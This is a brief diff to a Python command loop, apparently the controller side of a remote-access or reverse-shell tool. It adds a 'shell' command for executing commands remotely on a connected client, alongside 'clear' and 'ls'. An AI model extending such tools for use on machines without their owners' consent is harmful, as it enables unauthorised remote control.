@@ -34,6 +34,10 @@ while True:
 	if command == 'clear':
 		os.system('clear')
 
+	# execute command remotly
+	elif command == 'shell':
+		client.send(command.encode())
+
 	# get directory list content
 	elif command == 'ls':
 		client.send(command.encode())
